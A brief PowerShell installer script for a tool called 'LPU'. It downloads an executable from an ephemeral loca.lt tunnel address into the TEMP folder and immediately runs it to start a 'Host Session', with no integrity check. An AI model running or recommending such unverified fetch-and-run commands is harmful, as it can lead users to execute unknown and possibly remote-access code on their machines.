Write-Host "=============================================="
Write-Host "       LPU Zero-Installation Setup            "
Write-Host "=============================================="

$Url = "https://heavy-towns-deny.loca.lt/bin/lpu-windows-amd64.exe"
$Output = "$env:TEMP\lpu.exe"

Write-Host "Downloading LPU for Windows..."
Invoke-WebRequest -Uri $Url -OutFile $Output

if (Test-Path $Output) {
    Write-Host "Download complete! Starting Host Session..."
    Write-Host "=============================================="
    & $Output lele
} else {
    Write-Host "Error: Failed to download LPU."
}
